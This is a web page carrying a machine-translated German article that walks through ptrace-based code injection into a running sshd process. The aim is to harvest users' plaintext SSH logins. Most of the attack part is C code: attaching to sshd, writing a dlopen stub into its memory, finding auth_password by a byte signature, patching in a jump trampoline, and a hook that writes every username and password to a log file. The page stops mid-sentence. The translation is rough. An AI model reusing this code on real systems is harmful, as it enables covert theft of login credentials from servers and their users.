<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üèâ üëã üë®üèæ‚Äçü§ù‚Äçüë®üèΩ Eine Einf√ºhrung in ptrace oder Code Injection in sshd zum Spa√ü ü§π üï¥Ô∏è üßîüèΩ</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Das Ziel, das ich mir gesetzt habe, war sehr einfach: das in sshd eingegebene Passwort mit ptrace zu lernen. Nat√ºrlich ist dies eine etwas k√ºnstliche ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Eine Einf√ºhrung in ptrace oder Code Injection in sshd zum Spa√ü</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/430302/"><img src="https://habrastorage.org/webt/ep/w1/el/epw1elpz3alvv_6vifmtdbazam0.png"><br><br>  Das Ziel, das ich mir gesetzt habe, war sehr einfach: das in sshd eingegebene Passwort mit ptrace zu lernen.  Nat√ºrlich ist dies eine etwas k√ºnstliche Aufgabe, da es viele andere, effektivere M√∂glichkeiten gibt, um das zu erreichen, was Sie wollen (und mit einer viel geringeren Wahrscheinlichkeit, <abbr title="Segmentierungsfehler">SEGV zu</abbr> bekommen), aber es schien mir cool, genau das zu tun. <br><a name="habracut"></a><br><h1>  Was ist ptrace? </h1><br>  Diejenigen, die mit Injektionen unter Windows vertraut sind, kennen wahrscheinlich die Funktionen <code>VirtualAllocEx()</code> , <code>WriteProcessMemory()</code> , <code>ReadProcessMemory()</code> und <code>CreateRemoteThread()</code> .  Mit diesen Aufrufen k√∂nnen Sie Speicher zuweisen und Threads in einem anderen Prozess starten.  In der Linux-Welt stellt uns der Kernel <code>ptrace</code> , dank dessen Debugger mit dem laufenden Prozess interagieren k√∂nnen. <br><br>  Ptrace bietet verschiedene n√ºtzliche Debugging-Vorg√§nge, zum Beispiel: <br><br><ul><li>  PTRACE_ATTACH - Erm√∂glicht es Ihnen, einem einzelnen Prozess beizutreten, indem Sie einen debuggten Prozess anhalten </li><li>  PTRACE_PEEKTEXT - Erm√∂glicht das Lesen von Daten aus dem Adressraum eines anderen Prozesses </li><li>  PTRACE_POKETEXT - Erm√∂glicht das Schreiben von Daten in den Adressraum eines anderen Prozesses </li><li>  PTRACE_GETREGS - Liest den aktuellen Status der Prozessregister </li><li>  PTRACE_SETREGS - zeichnet den Status von Prozessregistern auf </li><li>  PTRACE_CONT - setzt die Ausf√ºhrung des debuggten Prozesses fort </li></ul><br>  Obwohl dies keine vollst√§ndige Liste der ptrace-Funktionen ist, stie√ü ich aufgrund des Mangels an Funktionen, die mir aus Win32 bekannt sind, auf Schwierigkeiten.  Unter Windows k√∂nnen Sie beispielsweise Speicher in einem anderen Prozess mithilfe der Funktion <code>VirtualAllocEx()</code> , die einen Zeiger auf den neu zugewiesenen Speicher zur√ºckgibt.  Da dies in ptrace nicht vorhanden ist, m√ºssen Sie improvisieren, wenn Sie Ihren Code in einen anderen Prozess einbetten m√∂chten. <br><br>  Dann √ºberlegen wir uns, wie Sie mit ptrace die Kontrolle √ºber einen Prozess √ºbernehmen k√∂nnen. <br><br><h1>  Ptrace Grundlagen </h1><br>  Das erste, was wir tun m√ºssen, ist, uns dem f√ºr uns interessanten Prozess anzuschlie√üen.  Rufen Sie dazu einfach ptrace mit dem Parameter PTRACE_ATTACH auf: <br><br><pre> <code class="cpp hljs">ptrace(PTRACE_ATTACH, pid, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>);</code> </pre><br>  Dieser Aufruf ist einfach wie ein Stau und akzeptiert die PID des Prozesses, dem wir beitreten m√∂chten.  Wenn ein Anruf erfolgt, wird ein SIGSTOP-Signal gesendet, das den interessierenden Prozess zum Stoppen zwingt. <br><br>  Nach dem Beitritt gibt es einen Grund, den Status aller Register zu speichern, bevor wir beginnen, etwas zu √§ndern.  Dadurch k√∂nnen wir das Programm sp√§ter wiederherstellen: <br><br><pre> <code class="cpp hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">user_regs_struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">oldregs</span></span></span><span class="hljs-class">;</span></span> ptrace(PTRACE_GETREGS, pid, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, &amp;oldregs);</code> </pre><br>  Als n√§chstes m√ºssen Sie einen Ort finden, an dem wir unseren Code schreiben k√∂nnen.  Am einfachsten ist es, Informationen aus der Maps-Datei zu extrahieren, die in procfs f√ºr jeden Prozess enthalten sind.  Zum Beispiel sieht "/ proc / PID / maps" in einem laufenden sshd-Prozess unter Ubuntu folgenderma√üen aus: <br><br><img src="https://habrastorage.org/webt/me/_2/ug/me_2ugeh7hugdyuqx_xfkp-myuy.png"><br><br>  Wir m√ºssen den Speicherbereich finden, dem das Recht zur Ausf√ºhrung zugewiesen wurde (h√∂chstwahrscheinlich "r-xp").  Sobald wir den Bereich finden, der zu uns passt, speichern wir analog zu den Registern den Inhalt, damit wir sp√§ter die Arbeit korrekt wiederherstellen k√∂nnen: <br><br><pre> <code class="cpp hljs">ptrace(PTRACE_PEEKTEXT, pid, addr, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>);</code> </pre><br>  Mit ptrace k√∂nnen Sie ein Maschinendatenwort (32 Bit bei x86 oder 64 Bit bei x86_64) an der angegebenen Adresse lesen. Um also mehr Daten zu lesen, m√ºssen Sie mehrere Anrufe t√§tigen und die Adresse erh√∂hen. <br><br>  <i>Hinweis: Unter Linux gibt es auch process_vm_readv () und process_vm_writev (), um mit dem Adressraum eines anderen Prozesses zu arbeiten.</i>  <i>In diesem Artikel werde ich mich jedoch an die Verwendung von ptrace halten.</i>  <i>Wenn Sie etwas anderes machen m√∂chten, lesen Sie besser diese Funktionen.</i> <br><br>  Nachdem wir den gew√ºnschten Speicherbereich gesichert haben, k√∂nnen wir mit dem √úberschreiben beginnen: <br><br><pre> <code class="cpp hljs">ptrace(PTRACE_POKETEXT, pid, addr, word);</code> </pre><br>  Wie bei PTRACE_PEEKTEXT kann dieser Aufruf jeweils nur ein Maschinenwort an der angegebenen Adresse aufzeichnen.  Das Schreiben von mehr als einem Maschinenwort erfordert au√üerdem viele Anrufe. <br><br>  Nachdem Sie Ihren Code geladen haben, m√ºssen Sie die Kontrolle darauf √ºbertragen.  Um die Daten im Speicher (z. B. den Stapel) nicht zu √ºberschreiben, verwenden wir die zuvor gespeicherten Register: <br><br><pre> <code class="cpp hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">user_regs_struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">r</span></span></span><span class="hljs-class">;</span></span> <span class="hljs-built_in"><span class="hljs-built_in">memcpy</span></span>(&amp;r, &amp;oldregs, <span class="hljs-keyword"><span class="hljs-keyword">sizeof</span></span>(struct user_regs_struct)); <span class="hljs-comment"><span class="hljs-comment">// Update RIP to point to our injected code regs.rip = addr_of_injected_code; ptrace(PTRACE_SETREGS, pid, NULL, &amp;r);</span></span></code> </pre><br>  Schlie√ülich k√∂nnen wir die Ausf√ºhrung mit PTRACE_CONT fortsetzen: <br><br><pre> <code class="cpp hljs">ptrace(PTRACE_CONT, pid, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>);</code> </pre><br>  Aber woher wissen wir, dass die Ausf√ºhrung unseres Codes abgeschlossen ist?  Wir werden einen Software-Interrupt verwenden, der auch als "int 0x03" -Anweisung bekannt ist und SIGTRAP generiert.  Wir werden mit waitpid () darauf warten: <br><br><pre> <code class="cpp hljs">waitpid(pid, &amp;status, WUNTRACED);</code> </pre><br>  waitpid () - Ein blockierender Aufruf, der darauf wartet, dass der Prozess mit der PID-Kennung beendet wird, und den Grund f√ºr den Stopp in die Statusvariable schreibt.  Hier gibt es √ºbrigens eine Reihe von Makros, die das Leben vereinfachen, um den Grund f√ºr den Stopp herauszufinden. <br><br>  Um herauszufinden, ob aufgrund von SIGTRAP (aufgrund des Aufrufs von int 0x03) ein Stopp aufgetreten ist, k√∂nnen wir Folgendes tun: <br><br><pre> <code class="cpp hljs">waitpid(pid, &amp;status, WUNTRACED); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (WIFSTOPPED(status) &amp;&amp; WSTOPSIG(status) == SIGTRAP) { <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(<span class="hljs-string"><span class="hljs-string">"SIGTRAP received\n"</span></span>); }</code> </pre><br>  Zu diesem Zeitpunkt wurde unser eingebetteter Code bereits ausgef√ºhrt und wir m√ºssen lediglich den urspr√ºnglichen Zustand des Prozesses wiederherstellen.  Stellen Sie alle Register wieder her: <br><br><pre> <code class="cpp hljs">ptrace(PTRACE_SETREGS, pid, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, &amp;origregs);</code> </pre><br>  Dann werden wir die Originaldaten im Speicher zur√ºckgeben: <br><br><pre> <code class="cpp hljs">ptrace(PTRACE_POKETEXT, pid, addr, word);</code> </pre><br>  Und trennen Sie sich vom Prozess: <br><br><pre> <code class="cpp hljs">ptrace(PTRACE_DETACH, pid, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>);</code> </pre><br>  Das ist genug Theorie.  Kommen wir zum interessanteren Teil. <br><br><h1>  Sshd Injektion </h1><br>  <i>Ich muss warnen, dass die M√∂glichkeit besteht, dass sshd gel√∂scht wird. Seien Sie also vorsichtig und versuchen Sie nicht, dies auf einem funktionierenden System und insbesondere auf einem Remote-System √ºber SSH: D zu √ºberpr√ºfen</i> <i><br><br></i>  <i>Dar√ºber hinaus gibt es mehrere bessere M√∂glichkeiten, um das gleiche Ergebnis zu erzielen. Ich demonstriere diese ausschlie√ülich als unterhaltsame M√∂glichkeit, die Kraft von ptrace zu demonstrieren (stimme zu, dass dies besser ist als die Injektion in Hello World;)</i> <br><br>  Das einzige, was ich tun wollte, war, die Login-Passwort-Kombination von sshd zu erhalten, wenn der Benutzer authentifiziert ist.  Wenn wir den Quellcode anzeigen, sehen wir ungef√§hr Folgendes: <br><br>  <a href="">auth-passwd.c</a> <br><br><pre> <code class="cpp hljs"><span class="hljs-comment"><span class="hljs-comment">/* * Tries to authenticate the user using password. Returns true if * authentication succeeds. */</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">int</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">auth_password</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Authctxt *authctxt, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">const</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">char</span></span></span></span><span class="hljs-function"><span class="hljs-params"> *password)</span></span></span><span class="hljs-function"> </span></span>{ ... }</code> </pre><br>  Es scheint ein gro√üartiger Ort zu sein, um zu versuchen, den vom Benutzer im Klartext √ºbermittelten Benutzernamen / Passwort zu entfernen. <br><br>  Wir m√∂chten eine Funktionssignatur finden, mit der wir ihre [Funktion] im Speicher finden k√∂nnen.  Ich verwende mein Lieblingsdienstprogramm zur Demontage, radare2: <br><br><img src="https://habrastorage.org/webt/4r/xx/z_/4rxxz_4bv-g5uoo3fiqsxueeefo.png"><br><br>  Es ist notwendig, eine Folge von Bytes zu finden, die eindeutig ist und nur in der Funktion auth_password vorkommt.  Dazu verwenden wir die Suche in radare2: <br><br><img src="https://habrastorage.org/webt/aq/ie/qt/aqieqttr95rwwklbsvyiwnh86no.png"><br><br>  Es kam vor, dass die Sequenz <code>xor rdx, rdx; cmp rax, 0x400</code>  <code>xor rdx, rdx; cmp rax, 0x400</code> unseren Anforderungen und wird nur einmal in der gesamten ELF-Datei gefunden. <br><br>  Als Hinweis ... Wenn Sie diese Sequenz nicht haben, stellen Sie sicher, dass Sie √ºber die neueste Version verf√ºgen, wodurch auch <a href="">die</a> Sicherheitsanf√§lligkeit von Mitte 2016 geschlossen wird. (In Version 7.6 ist diese Sequenz ebenfalls eindeutig - ca. Per.) <br><br>  Der n√§chste Schritt ist die Code-Injektion. <br><br><h1>  Laden Sie .so auf sshd herunter </h1><br>  Um unseren Code in sshd zu laden, erstellen wir einen kleinen Stub, mit dem wir dlopen () aufrufen und eine dynamische Bibliothek laden k√∂nnen, die bereits die Ersetzung von "auth_password" implementiert. <br><br>  dlopen () ist ein Aufruf zur dynamischen Verkn√ºpfung, der den Pfad zur dynamischen Bibliothek in Argumenten verwendet und in den Adressraum des aufrufenden Prozesses l√§dt.  Diese Funktion befindet sich in libdl.so, das dynamisch mit der Anwendung verkn√ºpft ist. <br><br>  Gl√ºcklicherweise ist in unserem Fall libdl.so bereits in sshd geladen, sodass wir nur dlopen () ausf√ºhren m√ºssen.  Aufgrund von <abbr title="Randomisierung des Adressraumlayouts">ASLR ist es jedoch</abbr> sehr unwahrscheinlich, dass sich dlopen () jedes Mal am selben Ort befindet, sodass Sie die Adresse im sshd-Speicher finden m√ºssen. <br><br>  Um die Adresse der Funktion zu finden, m√ºssen Sie den Offset berechnen - die Differenz zwischen der Adresse der Funktion dlopen () und der Startadresse von libdl.so: <br><br><pre> <code class="cpp hljs"><span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> libdlAddr, dlopenAddr; libdlAddr = (<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span>)dlopen(<span class="hljs-string"><span class="hljs-string">"libdl.so"</span></span>, RTLD_LAZY); dlopenAddr = (<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span>)dlsym(libdlAddr, <span class="hljs-string"><span class="hljs-string">"dlopen"</span></span>); <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(<span class="hljs-string"><span class="hljs-string">"Offset: %llx\n"</span></span>, dlopenAddr - libdlAddr);</code> </pre><br>  Nachdem wir den Offset berechnet haben, m√ºssen wir die Startadresse von libdl.so aus der Map-Datei ermitteln: <br><br><img src="https://habrastorage.org/webt/pm/vu/ja/pmvuja0gax1gdlqv48bwpeiadu0.png"><br><br>  Wenn wir die Basisadresse von libdl.so in sshd kennen (0x7f0490a0d000, wie im obigen Screenshot gezeigt), k√∂nnen wir einen Offset hinzuf√ºgen und die Adresse dlopen () aus dem Injektionscode aufrufen. <br><br>  Wir werden alle notwendigen Adressen mit PTRACE_SETREGS durch die Register leiten. <br><br>  Es ist auch erforderlich, den Pfad zur implantierten Bibliothek in den sshd-Adressraum zu schreiben, zum Beispiel: <br><br><pre> <code class="cpp hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ptraceWrite</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> pid, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">unsigned</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">long</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">long</span></span></span></span><span class="hljs-function"><span class="hljs-params"> addr, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">void</span></span></span></span><span class="hljs-function"><span class="hljs-params"> *data, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> len)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> word = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (i=<span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; len; i+=<span class="hljs-keyword"><span class="hljs-keyword">sizeof</span></span>(word), word=<span class="hljs-number"><span class="hljs-number">0</span></span>) { <span class="hljs-built_in"><span class="hljs-built_in">memcpy</span></span>(&amp;word, data + i, <span class="hljs-keyword"><span class="hljs-keyword">sizeof</span></span>(word)); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (ptrace(PTRACE_POKETEXT, pid, addr + i, word)) == <span class="hljs-number"><span class="hljs-number">-1</span></span>) { <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(<span class="hljs-string"><span class="hljs-string">"[!] Error writing process memory\n"</span></span>); <span class="hljs-built_in"><span class="hljs-built_in">exit</span></span>(<span class="hljs-number"><span class="hljs-number">1</span></span>); } } } ptraceWrite(pid, (<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span>)freeaddr, <span class="hljs-string"><span class="hljs-string">"/tmp/inject.so\x00"</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>)</code> </pre><br>  Indem wir w√§hrend der Vorbereitung der Injektion so viel wie m√∂glich tun und die Zeiger auf die Argumente direkt in die Register laden, k√∂nnen wir den Injektionscode vereinfachen.  Zum Beispiel: <br><br><pre> <code class="cpp hljs"><span class="hljs-comment"><span class="hljs-comment">// Update RIP to point to our code, which will be just after // our injected library name string regs.rip = (unsigned long long)freeaddr + DLOPEN_STRING_LEN + NOP_SLED_LEN; // Update RAX to point to dlopen() regs.rax = (unsigned long long)dlopenAddr; // Update RDI to point to our library name string regs.rdi = (unsigned long long)freeaddr; // Set RSI as RTLD_LAZY for the dlopen call regs.rsi = 2; // RTLD_LAZY // Update the target process registers ptrace(PTRACE_SETREGS, pid, NULL, &amp;regs);</span></span></code> </pre><br>  Das hei√üt, die Code-Injection ist ganz einfach: <br><br><pre> <code class="cpp hljs">; RSI <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> as value <span class="hljs-string"><span class="hljs-string">'2'</span></span> (RTLD_LAZY) ; RDI <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> as <span class="hljs-keyword"><span class="hljs-keyword">char</span></span>* to shared library path ; RAX contains the address of dlopen call rax <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> <span class="hljs-number"><span class="hljs-number">0x03</span></span></code> </pre><br>  Es ist Zeit, unsere dynamische Bibliothek zu erstellen, die mit Injektionscode geladen wird. <br><br>  Bevor wir fortfahren, sollten Sie eine wichtige Sache ber√ºcksichtigen, die verwendet wird ... den dynamischen Bibliothekskonstruktor. <br><br><h1>  Konstruktor in dynamischen Bibliotheken </h1><br>  Dynamische Bibliotheken k√∂nnen beim Laden Code ausf√ºhren.  Markieren Sie dazu die Funktionen mit dem Decoder "__attribute __ ((Konstruktor))".  Zum Beispiel: <br><br><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; void __attribute__((constructor)) test(void) { printf("Library loaded on dlopen()\n"); }</span></span></span></span></code> </pre> <br>  Sie k√∂nnen mit einem einfachen Befehl kopieren: <br><br><pre> <code class="bash hljs">gcc -o test.so --shared -fPIC test.c</code> </pre><br>  Und dann √ºberpr√ºfen Sie die Leistung: <br><br><pre> <code class="cpp hljs">dlopen(<span class="hljs-string"><span class="hljs-string">"./test.so"</span></span>, RTLD_LAZY);</code> </pre><br>  Wenn die Bibliothek geladen wird, wird der Konstruktor auch aufgerufen: <br><br><img src="https://habrastorage.org/webt/c1/ez/ao/c1ezaodwm4j0tk8mmqmhwhjbl5i.png"><br><br>  Wir verwenden diese Funktionalit√§t auch, um unser Leben zu erleichtern, wenn wir Code in den Adressraum eines anderen Prozesses einf√ºgen. <br><br><h1>  Dynamische Sshd-Bibliothek </h1><br>  Nachdem wir nun die M√∂glichkeit haben, unsere dynamische Bibliothek zu laden, m√ºssen wir Code erstellen, der das Verhalten von auth_password () zur Laufzeit √§ndert. <br><br>  Wenn unsere dynamische Bibliothek geladen ist, k√∂nnen wir die sshd-Startadresse mithilfe der Datei "/ proc / self / maps" in procfs finden.  Wir suchen nach einem Bereich mit "rx" -Berechtigungen, in dem wir nach einer eindeutigen Sequenz in auth_password () suchen: <br><br><pre> <code class="cpp hljs">d = fopen(<span class="hljs-string"><span class="hljs-string">"/proc/self/maps"</span></span>, <span class="hljs-string"><span class="hljs-string">"r"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">while</span></span>(fgets(buffer, <span class="hljs-keyword"><span class="hljs-keyword">sizeof</span></span>(buffer), fd)) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-built_in"><span class="hljs-built_in">strstr</span></span>(buffer, <span class="hljs-string"><span class="hljs-string">"/sshd"</span></span>) &amp;&amp; <span class="hljs-built_in"><span class="hljs-built_in">strstr</span></span>(buffer, <span class="hljs-string"><span class="hljs-string">"rx"</span></span>)) { ptr = strtoull(buffer, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>); end = strtoull(<span class="hljs-built_in"><span class="hljs-built_in">strstr</span></span>(buffer, <span class="hljs-string"><span class="hljs-string">"-"</span></span>)+<span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } }</code> </pre><br>  Da wir nach einer Reihe von Adressen suchen m√ºssen, suchen wir nach einer Funktion: <br><br><pre> <code class="cpp hljs"><span class="hljs-keyword"><span class="hljs-keyword">const</span></span> <span class="hljs-keyword"><span class="hljs-keyword">char</span></span> *search = <span class="hljs-string"><span class="hljs-string">"\x31\xd2\x48\x3d\x00\x04\x00\x00"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">while</span></span>(ptr &lt; end) { <span class="hljs-comment"><span class="hljs-comment">// ptr[0] == search[0] added to increase performance during searching // no point calling memcmp if the first byte doesn't match our signature. if (ptr[0] == search[0] &amp;&amp; memcmp(ptr, search, 9) == 0) { break; } ptr++; }</span></span></code> </pre><br>  Wenn wir eine √úbereinstimmung finden, m√ºssen Sie mprotect () verwenden, um die Berechtigungen f√ºr den Speicherbereich zu √§ndern.  Dies liegt alles daran, dass der Speicherbereich lesbar und ausf√ºhrbar ist und Schreib√§nderungen f√ºr √Ñnderungen unterwegs erforderlich sind: <br><br><pre> <code class="cpp hljs">mprotect((<span class="hljs-keyword"><span class="hljs-keyword">void</span></span>*)(((<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span>)ptr / <span class="hljs-number"><span class="hljs-number">4096</span></span>) * <span class="hljs-number"><span class="hljs-number">4096</span></span>), <span class="hljs-number"><span class="hljs-number">4096</span></span>*<span class="hljs-number"><span class="hljs-number">2</span></span>, PROT_READ | PROT_WRITE | PROT_EXEC)</code> </pre><br>  Nun, wir haben das Recht, in den gew√ºnschten Speicherbereich zu schreiben, und jetzt ist es an der Zeit, am Anfang der auth_password-Funktion ein kleines Sprungbrett hinzuzuf√ºgen, das die Steuerung an den Hook weitergibt: <br><br><pre> <code class="cpp hljs"><span class="hljs-keyword"><span class="hljs-keyword">char</span></span> jmphook[] = <span class="hljs-string"><span class="hljs-string">"\x48\xb8\x48\x47\x46\x45\x44\x43\x42\x41\xff\xe0"</span></span>;</code> </pre><br>  Dies entspricht diesem Code: <br><br><pre> <code class="cpp hljs">mov rax, <span class="hljs-number"><span class="hljs-number">0x4142434445464748</span></span> jmp rax</code> </pre> <br>  Nat√ºrlich ist die Adresse 0x4142434445464748 nicht f√ºr uns geeignet und wird durch die Adresse unseres Hakens ersetzt: <br><br><pre> <code class="cpp hljs">*(<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> *)((<span class="hljs-keyword"><span class="hljs-keyword">char</span></span>*)jmphook+<span class="hljs-number"><span class="hljs-number">2</span></span>) = &amp;passwd_hook;</code> </pre> <br>  Jetzt k√∂nnen wir einfach unser Sprungbrett in sshd einf√ºgen.  Setzen Sie das Sprungbrett ganz am Anfang der Funktion ein, um die Injektion sch√∂n und sauber zu machen: <br><br><pre> <code class="cpp hljs"><span class="hljs-comment"><span class="hljs-comment">// Step back to the start of the function, which is 32 bytes // before our signature ptr -= 32; memcpy(ptr, jmphook, sizeof(jmphook));</span></span></code> </pre><br>  Jetzt m√ºssen wir einen Hook implementieren, der sich mit der Protokollierung √ºbergebener Daten befasst.  Wir m√ºssen sicher sein, dass wir alle Register vor dem Start des Hooks gespeichert und wiederhergestellt haben, bevor wir zum urspr√ºnglichen Code zur√ºckkehren: <br><br><div class="spoiler">  <b class="spoiler_title">Hook-Quellcode</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-comment"><span class="hljs-comment">// Remember the prolog: push rbp; mov rbp, rsp; // that takes place when entering this function void passwd_hook(void *arg1, char *password) { // We want to store our registers for later asm("push %rsi\n" "push %rdi\n" "push %rax\n" "push %rbx\n" "push %rcx\n" "push %rdx\n" "push %r8\n" "push %r9\n" "push %r10\n" "push %r11\n" "push %r12\n" "push %rbp\n" "push %rsp\n" ); // Our code here, is used to store the username and password char buffer[1024]; int log = open(PASSWORD_LOCATION, O_CREAT | O_RDWR | O_APPEND); // Note: The magic offset of "arg1 + 32" contains a pointer to // the username from the passed argument. snprintf(buffer, sizeof(buffer), "Password entered: [%s] %s\n", *(void **)(arg1 + 32), password); write(log, buffer, strlen(buffer)); close(log); asm("pop %rsp\n" "pop %rbp\n" "pop %r12\n" "pop %r11\n" "pop %r10\n" "pop %r9\n" "pop %r8\n" "pop %rdx\n" "pop %rcx\n" "pop %rbx\n" "pop %rax\n" "pop %rdi\n" "pop %rsi\n" ); // Recover from the function prologue asm("mov %rbp, %rsp\n" "pop %rbp\n" ); ...</span></span></code> </pre><br></div></div><br>  Nun, das ist alles ... in gewisser Weise ... <br><br>  Leider ist dies nach all dem nicht alles.  Selbst wenn die SSH-Code-Injektion fehlgeschlagen ist, stellen Sie m√∂glicherweise fest, dass die gesuchten Benutzerkennw√∂rter immer noch nicht verf√ºgbar sind.  Dies liegt an der Tatsache, dass sshd f√ºr jede Verbindung ein neues untergeordnetes Element erstellt.  Es ist das neue Kind, das die Verbindung verarbeitet, und in ihm m√ºssen wir den Haken setzen. <br><br>  Um sicherzugehen, dass wir mit sshd-Kindern arbeiten, habe ich mich entschlossen, procfs nach Statistikdateien zu durchsuchen, in denen die √ºbergeordnete PID sshd angegeben ist.  Sobald ein solcher Prozess gefunden wird, startet der Injektor f√ºr ihn. <br><br>  Dies hat sogar Vorteile.  Wenn alles schief geht und die Code-Injection von SIGSEGV 